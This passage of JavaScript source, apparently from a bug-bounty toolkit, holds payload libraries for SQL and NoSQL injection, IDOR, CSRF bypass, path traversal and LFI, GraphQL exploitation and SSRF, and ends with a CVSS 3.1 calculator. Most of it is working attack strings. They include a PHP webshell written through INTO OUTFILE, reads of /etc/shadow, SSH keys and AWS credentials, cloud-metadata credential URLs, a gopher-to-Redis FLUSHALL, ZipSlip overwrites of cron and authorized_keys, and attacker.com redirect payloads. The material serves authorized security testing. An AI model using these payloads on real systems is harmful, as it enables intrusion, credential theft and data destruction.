        { p: "/*!50000UNION*/ /*!50000SELECT*/", d: 'MySQL versioned' },
        { p: "UnIoN SeLeCt", d: 'Mixed case' },
        { p: "UNION/*comment*/SELECT", d: 'Inline comment' },
        { p: "%0AUNION%0ASELECT", d: 'Newline' },
        { p: "1\u00a0OR\u00a01=1", d: 'Non-break space' },
        { p: "/*!u%6eion*/ /*!se%6cect*/", d: 'Hex char' },
      ]},
      { name: 'File Read / Write (MySQL)', items: [
        { p: "' UNION SELECT load_file('/etc/passwd')--", d: 'Read file' },
        { p: "' UNION SELECT '<?php system($_GET[c]);?>' INTO OUTFILE '/var/www/html/sh.php'--", d: 'Write webshell' },
      ]},
      { name: 'GraphQL SQLi', note: 'GraphQL params are common SQLi sinks (HackerOne IDOR pattern)', items: [
        { p: '{ user(id: "1\' OR 1=1--") { name } }', d: 'Quote in arg' },
        { p: '{ search(q: "x\' UNION SELECT NULL--") { results } }', d: 'Search field' },
      ]},
      { name: 'NoSQL Injection', items: [
        { p: '{"$ne": null}', d: 'Mongo not-null' },
        { p: '{"$gt": ""}', d: 'Mongo gt' },
        { p: '{"username":{"$regex":"^a"}}', d: 'Regex enum' },
        { p: "';return true;//", d: 'JS injection' },
      ]},
    ];
    return renderPayloadLibrary('SQLi Payloads & Techniques', sections, []);
  },
  init() { initPayloadLibrary(); }
};

// ===== IDOR HELPER =====
TOOLS['idor-helper'] = {
  title: 'IDOR Helper & Patterns',
  desc: 'Insecure Direct Object Reference patterns & test methodology from 180+ reports',
  render() {
    const sections = [
      { name: 'ID Types to Test', items: [
        { p: '1, 2, 3, ... 1000000', d: 'Sequential decimal' },
        { p: '00000001, 00000002', d: 'Padded numeric' },
        { p: '550e8400-e29b-41d4-a716-446655440000', d: 'UUID v4' },
        { p: 'deadbeef1234', d: 'Hex string' },
        { p: 'YWRtaW4=', d: 'Base64 encoded' },
        { p: 'attacker@evil.com', d: 'Email/username as ID' },
        { p: '1640995200', d: 'Unix timestamp' },
      ]},
      { name: 'Locations to Test', note: 'IDORs hide everywhere - not just URL params', items: [
        { p: '/api/user/{id}/profile', d: 'URL path' },
        { p: '?user_id=1234', d: 'Query string' },
        { p: '{"id": 1234}', d: 'JSON body' },
        { p: 'X-User-ID: 1234', d: 'Custom header' },
        { p: 'cookie: user=1234', d: 'Cookie value' },
        { p: 'GraphQL: user(id: "1234")', d: 'GraphQL arg' },
        { p: 'wss://... {"action":"sub","user":1234}', d: 'WebSocket' },
        { p: '/rpc?method=getUser&id=1234', d: 'RPC call' },
      ]},
      { name: 'Test Techniques', items: [
        { p: 'Replace your ID with victim ID directly', d: 'Direct swap' },
        { p: 'Use your own ID in victim context (token swap)', d: 'Authorization confusion' },
        { p: 'Add ?user_id=victim to your request', d: 'Param injection' },
        { p: 'Send array: {"id":[1234,5678]}', d: 'Array smuggling' },
        { p: 'Wildcard: id=*', d: 'Wildcard test' },
        { p: 'Negative: id=-1, id=0', d: 'Edge case' },
        { p: 'Change HTTP method (GET→POST→PUT→DELETE)', d: 'Method swap' },
        { p: 'Change Content-Type to bypass validation', d: 'Content-Type swap' },
        { p: 'Add /../ in path or extension change', d: 'Path tricks' },
      ]},
      { name: 'Hash/Token Bypass', items: [
        { p: 'Sign with attacker key, victim ID', d: 'Signing oracle' },
        { p: 'JWT alg=none', d: 'JWT downgrade' },
        { p: 'Truncate hash / collision', d: 'Hash truncation' },
        { p: 'Use empty token', d: 'Empty creds bypass' },
      ]},
      { name: 'Functionalities Often Vulnerable', items: [
        { p: 'View profile, posts, photos, files', d: 'Read IDOR' },
        { p: 'Update settings, password, email', d: 'Update IDOR' },
        { p: 'Delete account, comment, file', d: 'Delete IDOR' },
        { p: 'Add member to group / org', d: 'Permission IDOR' },
        { p: 'Cancel subscription / order', d: 'Action IDOR' },
        { p: 'Export data / generate invoice', d: 'Data IDOR' },
        { p: 'Webhook URL of another tenant', d: 'Cross-tenant' },
      ]},
    ];
    return renderPayloadLibrary('IDOR Helper', sections, []);
  },
  init() { initPayloadLibrary(); }
};

// ===== CSRF BYPASS LIBRARY =====
TOOLS['csrf-bypass'] = {
  title: 'CSRF Bypass Techniques',
  desc: 'CSRF bypass patterns from 100+ real reports - use with the CSRF PoC Generator',
  render() {
    const sections = [
      { name: 'Token Bypasses', items: [
        { p: 'Remove the CSRF token parameter entirely', d: 'Empty token' },
        { p: 'Set token to empty string', d: 'Blank value' },
        { p: 'Use your own valid token on victim', d: 'Token swap (often works)' },
        { p: 'Use a token of the same length but random', d: 'Length-only validation' },
        { p: 'Change request method (POST → GET)', d: 'Method validation gap' },
        { p: 'Remove the token header (X-CSRF-Token)', d: 'Header-only check' },
        { p: 'Change Content-Type to text/plain or multipart', d: 'CT validation gap' },
      ]},
      { name: 'GET-Based State Change', note: 'Common in admin panels & mobile APIs', items: [
        { p: 'GET /api/delete?id=1', d: 'Direct GET CSRF' },
        { p: '<img src="https://target/api/delete?id=1">', d: 'Image-tag PoC' },
        { p: 'GraphQL GET mutations (?query=mutation{...})', d: 'GraphQL CSRF (Facebook $7.5k)' },
      ]},
      { name: 'SameSite Bypasses', items: [
        { p: 'Top-level navigation (form submit / window.open)', d: 'Bypasses Lax' },
        { p: 'Subdomain XSS → cookie context', d: 'Same-site XSS' },
        { p: 'GET requests bypass Lax for top-nav', d: 'Lax → GET allowed' },
        { p: '<2 minute window after Set-Cookie (Chrome Lax-by-default)', d: '120s grace period' },
      ]},
      { name: 'Token Leakage', items: [
        { p: 'Token in URL → leaked via Referer', d: 'Referer leak' },
        { p: 'Token in JSON response → fetched cross-origin', d: 'CORS misconfig leak' },
        { p: 'Token in HTML page accessible to XSS', d: 'XSS → CSRF chain' },
        { p: 'Fixed/predictable tokens (hash of user ID)', d: 'Predictable token' },
      ]},
      { name: 'OAuth / SSO CSRF', items: [
        { p: 'Missing state parameter → login CSRF', d: 'OAuth state missing' },
        { p: 'Null byte in state (state=foo%00bar)', d: 'State validation bypass' },
        { p: 'state=attacker_state on victim', d: 'Account merge' },
        { p: 'HEAD method → CSRF token check skipped (GitHub $25k)', d: 'HEAD method abuse' },
      ]},
      { name: 'JSON / API CSRF', items: [
        { p: '<form enctype="text/plain" action="...">', d: 'JSON via form' },
        { p: 'Flash → 307 redirect with JSON body', d: 'Legacy 307 redirect' },
        { p: 'CORS misconfig: ACAO=null + ACAC=true', d: 'CORS-based CSRF' },
        { p: 'CL.0 / smuggling on token endpoint', d: 'Smuggling chain' },
      ]},
      { name: 'Notable Patterns', items: [
        { p: 'Client-side path traversal in form action (GitLab $6.5k)', d: 'Path traversal CSRF' },
        { p: 'Azure EmojiDeploy: zip upload via CSRF → RCE ($30k)', d: 'CSRF → RCE' },
        { p: 'Facebook: GET endpoint that triggers POST fetch internally', d: 'Hidden POST' },
      ]},
    ];
    return renderPayloadLibrary('CSRF Bypass Techniques', sections, []);
  },
  init() { initPayloadLibrary(); }
};

// ===== PATH TRAVERSAL / FILE DISCLOSURE =====
TOOLS['path-traversal'] = {
  title: 'Path Traversal / LFI Helper',
  desc: 'File disclosure & path traversal payloads from 73+ reports including Apache & WAF bypasses',
  render() {
    const sections = [
      { name: 'Basic Traversal', items: [
        { p: '../../../etc/passwd', d: 'Linux 3 levels' },
        { p: '../../../../../../etc/passwd', d: 'Deep traversal' },
        { p: '..\\..\\..\\windows\\win.ini', d: 'Windows backslash' },
        { p: '../../../../../../../../../../etc/passwd', d: 'Very deep (safe default)' },
        { p: '/etc/passwd', d: 'Absolute path' },
        { p: 'C:\\Windows\\win.ini', d: 'Windows absolute' },
        { p: 'file:///etc/passwd', d: 'file:// scheme' },
      ]},
      { name: 'Encoded Variants', note: 'Try when basic ../ is filtered', items: [
        { p: '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd', d: 'URL encoded' },
        { p: '%252e%252e%252f', d: 'Double URL encoded' },
        { p: '..%c0%af', d: 'Overlong UTF-8' },
        { p: '..%ef%bc%8f', d: 'Unicode slash' },
        { p: '%%32%65%%32%65/', d: 'Apache 2.4.49 bypass (CVE-2021-41773)' },
        { p: '..%5c..%5c..%5c', d: 'Encoded backslash' },
        { p: '..%2f..%2f..%2f', d: 'Encoded slash' },
      ]},
      { name: 'Filter Bypass Tricks', items: [
        { p: '....//....//....//etc/passwd', d: 'Replace ../ removed once' },
        { p: '..//..//..//etc/passwd', d: 'Double slash' },
        { p: '..;/..;/..;/etc/passwd', d: 'Secondary context (..;/) - Starbucks $4k' },
        { p: 'web\\..\\.\\..\\etc\\passwd', d: 'Embedded in dirname (Sam Curry)' },
        { p: '../../../etc/passwd%00', d: 'Null byte (legacy PHP)' },
        { p: '../../../etc/passwd%00.png', d: 'Null byte + ext' },
        { p: '/proc/self/environ', d: 'Read env vars' },
        { p: '/proc/self/cmdline', d: 'Read cmdline' },
      ]},
      { name: 'Useful Linux Files', items: [
        { p: '/etc/passwd', d: 'User list' },
        { p: '/etc/shadow', d: 'Hashes (root only)' },
        { p: '/etc/hosts', d: 'Internal hostnames' },
        { p: '/proc/self/environ', d: 'Env vars' },
        { p: '/proc/version', d: 'Kernel info' },
        { p: '/root/.ssh/id_rsa', d: 'SSH key' },
        { p: '/root/.bash_history', d: 'Bash history' },
        { p: '/var/log/apache2/access.log', d: 'Log poisoning' },
        { p: '/var/www/html/.env', d: 'App secrets' },
        { p: '/var/www/html/wp-config.php', d: 'WordPress config' },
        { p: '/.aws/credentials', d: 'AWS creds' },
        { p: '/.git/config', d: 'Git config' },
        { p: '/proc/self/cwd/.env', d: 'Relative .env via /proc' },
      ]},
      { name: 'Useful Windows Files', items: [
        { p: 'C:\\Windows\\win.ini', d: 'Windows ini' },
        { p: 'C:\\Windows\\System32\\drivers\\etc\\hosts', d: 'Hosts file' },
        { p: 'C:\\inetpub\\wwwroot\\web.config', d: 'IIS config' },
        { p: 'C:\\Windows\\repair\\sam', d: 'SAM (legacy)' },
        { p: 'C:\\Users\\Administrator\\.ssh\\id_rsa', d: 'SSH key' },
      ]},
      { name: 'PHP Wrappers (LFI → RCE)', items: [
        { p: 'php://filter/convert.base64-encode/resource=index.php', d: 'Read source' },
        { p: 'php://filter/read=string.rot13/resource=index.php', d: 'ROT13 read' },
        { p: 'php://input', d: 'POST body as code' },
        { p: 'data://text/plain,<?php system($_GET[c]);?>', d: 'Inline RCE' },
        { p: 'expect://id', d: 'Command exec (rare)' },
        { p: 'zip://shell.jpg%23payload.php', d: 'Zip wrapper RCE' },
      ]},
      { name: 'ZipSlip', note: 'Malicious archives with ../ in entry names - GitLab $29k', items: [
        { p: '../../../../etc/cron.d/pwn', d: 'Overwrite cron' },
        { p: '../../root/.ssh/authorized_keys', d: 'SSH key write' },
        { p: '..\\..\\..\\Windows\\System32\\config\\sam', d: 'Windows ZipSlip' },
      ]},
      { name: 'Nginx Alias Traversal', items: [
        { p: '/static../etc/passwd', d: 'Misconfigured alias (no trailing /)' },
        { p: '/api/v1../../../etc/passwd', d: 'API path alias' },
      ]},
      { name: 'SSRF + LFI Chains', items: [
        { p: 'http://target/?url=file:///etc/passwd', d: 'SSRF → file://' },
        { p: 'http://target/?url=gopher://internal:6379/_INFO', d: 'Gopher → Redis' },
        { p: 'http://target/?url=dict://internal:11211/stats', d: 'Dict → memcached' },
      ]},
    ];
    return renderPayloadLibrary('Path Traversal & File Disclosure', sections, []);
  },
  init() { initPayloadLibrary(); }
};

// ===== GRAPHQL HELPER =====
TOOLS['graphql-helper'] = {
  title: 'GraphQL Helper',
  desc: 'GraphQL exploitation queries: introspection, IDOR, DoS, CSRF, SQLi',
  render() {
    const sections = [
      { name: 'Introspection', note: 'First check - if enabled, dump the schema', items: [
        { p: '{__schema{types{name}}}', d: 'Quick check' },
        { p: '{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}}}', d: 'Full schema (use with fragments)' },
        { p: '{__type(name:"User"){name fields{name type{name kind ofType{name}}}}}', d: 'Inspect type' },
        { p: 'query IntrospectionQuery {__schema {queryType {name} mutationType {name} types {name kind description fields(includeDeprecated:true){name description type{...TypeRef}}}}}', d: 'Full introspection' },
      ]},
      { name: 'Introspection Bypass', items: [
        { p: 'POST /graphql with Content-Type: application/x-www-form-urlencoded', d: 'CT bypass' },
        { p: '{__schema\\n{types{name}}}', d: 'Newline bypass' },
        { p: 'GET /graphql?query={__schema{types{name}}}', d: 'GET method' },
        { p: '/v1/graphql, /api/graphql, /graphiql, /altair, /playground', d: 'Common endpoints' },
      ]},
      { name: 'IDOR via GraphQL', note: 'Most common GraphQL bug class', items: [
        { p: '{user(id:"1234"){email phone privateData}}', d: 'Direct ID swap' },
        { p: '{node(id:"VXNlcjoxMjM0"){...on User{email}}}', d: 'Relay node global ID' },
        { p: '{viewer{friends(first:100){edges{node{email}}}}}', d: 'Edges traversal' },
        { p: 'mutation{deletePost(id:"victim_post_id"){success}}', d: 'Cross-user delete' },
        { p: '{search(query:""){...on Private{secret}}}', d: 'Empty query enum' },
      ]},
      { name: 'GraphQL CSRF', items: [
        { p: 'GET /graphql?query=mutation{deleteAccount}', d: 'GET mutation (Facebook $7.5k)' },
        { p: 'Content-Type: application/x-www-form-urlencoded', d: 'Form-encoded body' },
        { p: '<form action="/graphql" method="POST"><input name="query" value="mutation{...}"></form>', d: 'Form CSRF' },
      ]},
      { name: 'GraphQL DoS', note: 'CVE-2022-37734 - query batching/nesting attacks', items: [
        { p: '{user{friends{friends{friends{friends{name}}}}}}', d: 'Deep nesting' },
        { p: '[{query:"{a:user{id}}"}, {query:"{b:user{id}}"}, ...]', d: 'Query batching' },
        { p: 'query{user @signature @signature @signature ...}', d: 'Directive overloading (Google $6k)' },
        { p: 'fragment A on User{friends{...A}}', d: 'Cyclic fragment' },
        { p: '{a:user{id} a:user{id} ...}', d: 'Field aliasing duplication' },
      ]},
      { name: 'SQLi via GraphQL', items: [
        { p: '{user(id:"1\' OR 1=1--"){name}}', d: 'String arg' },
        { p: '{search(filter:{name:{eq:"x\' UNION SELECT NULL--"}}){results}}', d: 'Filter SQLi' },
        { p: '{user(id:"1\' AND SLEEP(5)--"){name}}', d: 'Time-based' },
      ]},
      { name: 'Authorization Bypass', items: [
        { p: 'mutation{updateUser(id:"victim",input:{email:"a@b.c"}){id}}', d: 'Cross-tenant mutation' },
        { p: 'query{adminPanel{users{email}}} (as low-priv user)', d: 'Role check missing' },
        { p: 'Send same query twice rapidly', d: 'Cache misconfig (response leak)' },
        { p: '{me{...on Admin{secret}}}', d: 'Type confusion' },
      ]},
      { name: 'Useful Queries', items: [
        { p: '{__type(name:"Query"){fields{name}}}', d: 'List all queries' },
        { p: '{__type(name:"Mutation"){fields{name args{name type{name}}}}}', d: 'List mutations' },
        { p: '{__schema{directives{name args{name}}}}', d: 'List directives' },
      ]},
    ];
    return renderPayloadLibrary('GraphQL Helper', sections, []);
  },
  init() { initPayloadLibrary(); }
};

// ===== SSRF PAYLOAD LIBRARY =====
TOOLS['ssrf-helper'] = {
  title: 'SSRF Helper',
  desc: 'Server-Side Request Forgery payloads: cloud metadata, internal hosts, scheme abuse, filter bypass',
  render() {
    const sections = [
      { name: 'Cloud Metadata Endpoints', note: 'The classic SSRF win - read instance creds from the metadata service', items: [
        { p: 'http://169.254.169.254/latest/meta-data/', d: 'AWS metadata root' },
        { p: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/', d: 'AWS IAM creds (list roles)' },
        { p: 'http://169.254.169.254/latest/user-data/', d: 'AWS user-data (often has secrets)' },
        { p: 'http://169.254.169.254/latest/dynamic/instance-identity/document', d: 'AWS instance identity' },
        { p: 'http://169.254.169.254/latest/api/token', d: 'AWS IMDSv2 token endpoint (PUT)' },
        { p: 'http://metadata.google.internal/computeMetadata/v1/', d: 'GCP metadata (requires Metadata-Flavor: Google header)' },
        { p: 'http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token', d: 'GCP SA token' },
        { p: 'http://169.254.169.254/metadata/instance?api-version=2021-02-01', d: 'Azure IMDS (requires Metadata: true header)' },
        { p: 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/', d: 'Azure managed identity token' },
        { p: 'http://100.100.100.200/latest/meta-data/', d: 'Alibaba Cloud metadata' },
        { p: 'http://169.254.169.254/openstack/latest/meta_data.json', d: 'OpenStack metadata' },
        { p: 'http://169.254.169.254/metadata/v1/', d: 'DigitalOcean metadata' },
        { p: 'http://169.254.169.254/hetzner/v1/metadata', d: 'Hetzner metadata' },
        { p: 'http://rancher-metadata/latest', d: 'Rancher metadata' },
      ]},
      { name: 'Localhost / Internal Targets', note: 'Try every variant - WAFs miss creative encodings', items: [
        { p: 'http://127.0.0.1/', d: 'Loopback' },
        { p: 'http://localhost/', d: 'Loopback name' },
        { p: 'http://[::1]/', d: 'IPv6 loopback' },
        { p: 'http://[::ffff:127.0.0.1]/', d: 'IPv4-mapped IPv6' },
        { p: 'http://0.0.0.0/', d: 'Wildcard - hits localhost on Linux' },
        { p: 'http://0/', d: 'Short zero (resolves to 0.0.0.0)' },
        { p: 'http://127.1/', d: 'Octet shorthand' },
        { p: 'http://2130706433/', d: 'Decimal IP for 127.0.0.1' },
        { p: 'http://0x7f000001/', d: 'Hex IP for 127.0.0.1' },
        { p: 'http://017700000001/', d: 'Octal IP for 127.0.0.1' },
        { p: 'http://127.0.0.1.nip.io/', d: 'DNS wildcard service' },
        { p: 'http://localtest.me/', d: 'Always-127.0.0.1 hostname' },
        { p: 'http://spoofed.burpcollaborator.net/', d: 'DNS that resolves to internal' },
      ]},
      { name: 'Internal Service Probing', note: 'Common ports/services to hit once you have SSRF', items: [
        { p: 'http://127.0.0.1:6379/', d: 'Redis' },
        { p: 'http://127.0.0.1:11211/', d: 'Memcached' },
        { p: 'http://127.0.0.1:9200/', d: 'Elasticsearch' },
        { p: 'http://127.0.0.1:8500/v1/agent/self', d: 'Consul agent' },
        { p: 'http://127.0.0.1:2379/v2/keys/', d: 'etcd' },
        { p: 'http://127.0.0.1:5984/_all_dbs', d: 'CouchDB' },
        { p: 'http://127.0.0.1:8080/', d: 'Generic app port' },
        { p: 'http://127.0.0.1:9000/', d: 'PHP-FPM / SonarQube' },
        { p: 'http://127.0.0.1:15672/api/overview', d: 'RabbitMQ mgmt' },
        { p: 'http://127.0.0.1:5000/v2/_catalog', d: 'Docker registry' },
        { p: 'http://127.0.0.1:2375/containers/json', d: 'Docker daemon (unauthed) - RCE if exposed' },
        { p: 'http://127.0.0.1:10250/pods', d: 'Kubelet API' },
        { p: 'https://kubernetes.default.svc/api/v1/namespaces/', d: 'In-cluster k8s API' },
      ]},
      { name: 'Scheme Abuse', note: 'When http:// is filtered, try other schemes', items: [
        { p: 'file:///etc/passwd', d: 'Local file read' },
        { p: 'file:///c:/windows/win.ini', d: 'Windows file read' },
        { p: 'gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a', d: 'Gopher → Redis flushall' },
        { p: 'gopher://127.0.0.1:25/_HELO%20attacker.com%0d%0aMAIL%20FROM:...', d: 'Gopher → SMTP relay' },
        { p: 'dict://127.0.0.1:11211/stats', d: 'Dict → memcached' },
        { p: 'ldap://127.0.0.1:389/', d: 'LDAP probe' },
        { p: 'sftp://127.0.0.1/', d: 'SFTP probe' },
        { p: 'tftp://127.0.0.1/', d: 'TFTP probe' },
        { p: 'jar:http://attacker.com/x.zip!/', d: 'JAR scheme (Java)' },
        { p: 'netdoc:///etc/passwd', d: 'Java legacy file scheme' },
      ]},
      { name: 'URL Parser Confusion / Filter Bypass', note: 'Different parsers split URLs differently - exploit the gap', items: [
        { p: 'http://attacker.com#@127.0.0.1/', d: 'Fragment trick' },
        { p: 'http://attacker.com@127.0.0.1/', d: 'Userinfo trick (validator sees attacker.com)' },
        { p: 'http://127.0.0.1.attacker.com/', d: 'Subdomain prefix' },
        { p: 'http://attacker.com.127.0.0.1.nip.io/', d: 'nip.io abuse' },
        { p: 'http://127.0.0.1%23.attacker.com/', d: 'URL-encoded fragment' },
        { p: 'http://127.0.0.1%2f.attacker.com/', d: 'Encoded slash' },
        { p: 'http://127。0。0。1/', d: 'Unicode dots (CJK)' },
        { p: 'http://127．0．0．1/', d: 'Unicode fullwidth dots' },
        { p: 'http://①②⑦.⓪.⓪.①/', d: 'Enclosed alphanumerics' },
        { p: 'http://attacker.com\\@127.0.0.1/', d: 'Backslash trick' },
        { p: 'http://127.0.0.1./', d: 'Trailing dot' },
        { p: 'http://[0:0:0:0:0:ffff:127.0.0.1]/', d: 'Long IPv6 form' },
      ]},
      { name: 'Redirect-based SSRF', note: 'When the fetcher follows redirects, host an attacker page that 302s to internal', items: [
        { p: 'http://attacker.com/redirect.php?url=http://169.254.169.254/', d: 'Open redirect on attacker server' },
        { p: 'http://attacker.com/r → 302 Location: http://127.0.0.1/', d: 'Stage on your own server' },
        { p: 'https://httpbin.org/redirect-to?url=http://127.0.0.1/', d: 'Public redirect chain' },
      ]},
      { name: 'DNS Rebinding', note: 'TTL=0 hostname that flips between attacker IP (passes filter) and 127.0.0.1 (fetched)', items: [
        { p: 'rebind.network', d: 'Service for DNS rebinding' },
        { p: '1u.ms / lock.cmpxchg8b.com', d: 'Rebinder services' },
        { p: 'r7a8b9c.your-domain.com', d: 'Self-hosted dnsrebinder' },
      ]},
      { name: 'Blind SSRF Detection', note: 'No response in body? Use OOB callbacks', items: [
        { p: 'http://YOUR-SUBDOMAIN.oast.fun/', d: 'Interactsh (project discovery)' },
        { p: 'http://YOUR-SUBDOMAIN.burpcollaborator.net/', d: 'Burp Collaborator' },
        { p: 'http://YOUR-ID.requestbin.com/', d: 'RequestBin' },
        { p: 'https://webhook.site/YOUR-ID', d: 'webhook.site (browser-friendly)' },
        { p: 'http://canarytokens.org/', d: 'Canary tokens' },
      ]},
      { name: 'Real-world chains', items: [
        { p: 'SSRF → AWS metadata → role creds → S3 read → secrets', d: 'Capital One pattern' },
        { p: 'SSRF → Redis FLUSHALL + SET shell → CONFIG SET dir → SAVE → RCE', d: 'Redis-to-RCE via gopher' },
        { p: 'SSRF → Docker daemon (2375) → container start → RCE', d: 'Docker socket exposure' },
        { p: 'SSRF → Kubelet (10250) → pod exec → RCE', d: 'k8s lateral movement' },
        { p: 'PDF generator + HTML <iframe src=file://> → file disclosure', d: 'Headless Chrome PDF SSRF' },
        { p: 'WebP/SVG image fetcher → file:// or internal HTTP', d: 'Avatar uploader SSRF' },
      ]},
    ];
    return renderPayloadLibrary('SSRF Helper', sections, []);
  },
  init() { initPayloadLibrary(); }
};

// ============================================================
// REPORTING TOOLS
// ============================================================

// ===== CVSS 3.1 CALCULATOR =====
const CVSS31_METRICS = {
  AV: { name: 'Attack Vector', opts: [['N','Network'],['A','Adjacent'],['L','Local'],['P','Physical']], values: { N:0.85, A:0.62, L:0.55, P:0.2 } },
  AC: { name: 'Attack Complexity', opts: [['L','Low'],['H','High']], values: { L:0.77, H:0.44 } },
  PR: { name: 'Privileges Required', opts: [['N','None'],['L','Low'],['H','High']], values: { N:0.85, L:0.62, H:0.27 } },
  UI: { name: 'User Interaction', opts: [['N','None'],['R','Required']], values: { N:0.85, R:0.62 } },
  S: { name: 'Scope', opts: [['U','Unchanged'],['C','Changed']] },
  C: { name: 'Confidentiality', opts: [['H','High'],['L','Low'],['N','None']], values: { H:0.56, L:0.22, N:0 } },
  I: { name: 'Integrity', opts: [['H','High'],['L','Low'],['N','None']], values: { H:0.56, L:0.22, N:0 } },
  A: { name: 'Availability', opts: [['H','High'],['L','Low'],['N','None']], values: { H:0.56, L:0.22, N:0 } },
};

const calcCVSS31 = (sel) => {
  const { AV, AC, PR, UI, S, C, I, A } = sel;
  if (!AV || !AC || !PR || !UI || !S || !C || !I || !A) return null;

  // PR adjusted for changed scope
  const prVals = { U: { N:0.85, L:0.62, H:0.27 }, C: { N:0.85, L:0.68, H:0.5 } };
  const prScore = prVals[S][PR];

  const iss = 1 - ((1 - CVSS31_METRICS.C.values[C]) * (1 - CVSS31_METRICS.I.values[I]) * (1 - CVSS31_METRICS.A.values[A]));
  const impact = S === 'U' ? 6.42 * iss : 7.52 * (iss - 0.029) - 3.25 * Math.pow(iss - 0.02, 15);
  const exploitability = 8.22 * CVSS31_METRICS.AV.values[AV] * CVSS31_METRICS.AC.values[AC] * prScore * CVSS31_METRICS.UI.values[UI];
  let base;
  if (impact <= 0) base = 0;
  else if (S === 'U') base = Math.min(impact + exploitability, 10);
  else base = Math.min(1.08 * (impact + exploitability), 10);
  base = Math.ceil(base * 10) / 10;
  return base;
};

const severityFromScore = (s) => {
  if (s == null) return ['none', 'N/A'];
  if (s === 0) return ['none', 'None'];
  if (s < 4) return ['low', 'Low'];
  if (s < 7) return ['medium', 'Medium'];
  if (s < 9) return ['high', 'High'];
  return ['critical', 'Critical'];
};
const SEV_COLOR = { none: '#8b949e', low: '#22c55e', medium: '#f59e0b', high: '#f97316', critical: '#ef4444' };

// ----- CVSS per-option icons: AV keeps chandanbn sprite; the rest are clean inline SVGs -----
const G = '#23a34a', PG = '#cdeed7', D = '#1f2328';  // deep green (High), pale green (Low), dark outline
const CVSS_SVG = {
  bolt: `<svg viewBox="0 0 24 24"><path d="M13 3L5 14h6l-1 7 8-11h-6z" fill="${G}" stroke="${D}" stroke-width="1.6" stroke-linejoin="round"/></svg>`,
  puzzle: `<svg viewBox="0 0 24 24"><path d="M6 5h4a2 2 0 1 1 4 0h4v4a2 2 0 1 0 0 4v4h-4a2 2 0 1 0-4 0H6v-4a2 2 0 1 1 0-4z" fill="${G}" stroke="${D}" stroke-width="1.6" stroke-linejoin="round"/></svg>`,
  ban: `<svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="9" fill="${PG}" stroke="${D}" stroke-width="1.6"/><path d="M6 6l12 12" fill="none" stroke="${D}" stroke-width="1.6"/></svg>`,
  flag: `<svg viewBox="0 0 24 24"><path d="M6 21V4" fill="none" stroke="${D}" stroke-width="1.6" stroke-linecap="round"/><path d="M6 4h11l-2 4 2 4H6z" fill="${G}" stroke="${D}" stroke-width="1.6" stroke-linejoin="round"/></svg>`,
  unlock: `<svg viewBox="0 0 24 24"><rect x="5" y="11" width="14" height="9" rx="2" fill="${PG}" stroke="${D}" stroke-width="1.6"/><path d="M8 11V8a4 4 0 0 1 7-2.6" fill="none" stroke="${D}" stroke-width="1.6"/></svg>`,
  user: `<svg viewBox="0 0 24 24"><circle cx="12" cy="8" r="4" fill="${G}" stroke="${D}" stroke-width="1.6"/><path d="M4.5 20.5a7.5 7.5 0 0 1 15 0z" fill="${G}" stroke="${D}" stroke-width="1.6" stroke-linejoin="round"/></svg>`,
  usershield: `<svg viewBox="0 0 24 24"><circle cx="9.5" cy="8" r="3.3" fill="none" stroke="${D}" stroke-width="1.6"/><path d="M3.5 20.5a6.5 6.5 0 0 1 10-5" fill="none" stroke="${D}" stroke-width="1.6"/><path d="M18 12.5l3.2 1.1v2.9c0 2.1-1.6 3.2-3.2 3.7-1.6-.5-3.2-1.6-3.2-3.7v-2.9z" fill="${G}" stroke="${D}" stroke-width="1.6" stroke-linejoin="round"/></svg>`,
  pointer: `<svg viewBox="0 0 24 24"><path d="M5 3l6 18 2-7 7-2z" fill="${G}" stroke="${D}" stroke-width="1.6" stroke-linejoin="round"/></svg>`,
  box: `<svg viewBox="0 0 24 24"><rect x="5" y="5" width="14" height="14" rx="2" fill="${G}" stroke="${D}" stroke-width="1.6"/></svg>`,
  boxshift: `<svg viewBox="0 0 24 24"><rect x="3" y="4" width="10" height="10" rx="2" fill="${G}" stroke="${D}" stroke-width="1.6"/><path d="M11 18h8M19 18l-3-3M19 18l-3 3" fill="none" stroke="${D}" stroke-width="1.6" stroke-linejoin="round"/></svg>`,
  lock: `<svg viewBox="0 0 24 24"><rect x="5" y="11" width="14" height="9" rx="2" fill="${G}" stroke="${D}" stroke-width="1.6"/><path d="M8 11V8a4 4 0 1 1 8 0v3" fill="none" stroke="${D}" stroke-width="1.6"/></svg>`,
  pencil: `<svg viewBox="0 0 24 24"><path d="M4 20l4-1L19 8l-3-3L5 16z" fill="${G}" stroke="${D}" stroke-width="1.6" stroke-linejoin="round"/></svg>`,
  penciloff: `<svg viewBox="0 0 24 24"><path d="M4 20l4-1L19 8l-3-3L5 16z" fill="${PG}" stroke="${D}" stroke-width="1.6" stroke-linejoin="round"/><path d="M3 3l18 18" fill="none" stroke="${D}" stroke-width="1.8" stroke-linecap="round"/></svg>`,
  power: `<svg viewBox="0 0 24 24"><circle cx="12" cy="13" r="8.5" fill="${G}" stroke="${D}" stroke-width="1.6"/><path d="M12 5v6" fill="none" stroke="${D}" stroke-width="1.6" stroke-linecap="round"/><path d="M8.3 9a5 5 0 1 0 7.4 0" fill="none" stroke="${D}" stroke-width="1.6" stroke-linecap="round"/></svg>`,
  poweroff: `<svg viewBox="0 0 24 24"><circle cx="12" cy="13" r="8.5" fill="${PG}" stroke="${D}" stroke-width="1.6"/><path d="M12 5v6" fill="none" stroke="${D}" stroke-width="1.6" stroke-linecap="round"/><path d="M8.3 9a5 5 0 1 0 7.4 0" fill="none" stroke="${D}" stroke-width="1.6" stroke-linecap="round"/><path d="M4 4l16 16" fill="none" stroke="${D}" stroke-width="1.8" stroke-linecap="round"/></svg>`,
  lockLow: `<svg viewBox="0 0 24 24"><rect x="5" y="11" width="14" height="9" rx="2" fill="${PG}" stroke="${D}" stroke-width="1.6"/><path d="M8 11V8a4 4 0 1 1 8 0v3" fill="none" stroke="${D}" stroke-width="1.6"/></svg>`,
  pencilLow: `<svg viewBox="0 0 24 24"><path d="M4 20l4-1L19 8l-3-3L5 16z" fill="${PG}" stroke="${D}" stroke-width="1.6" stroke-linejoin="round"/></svg>`,
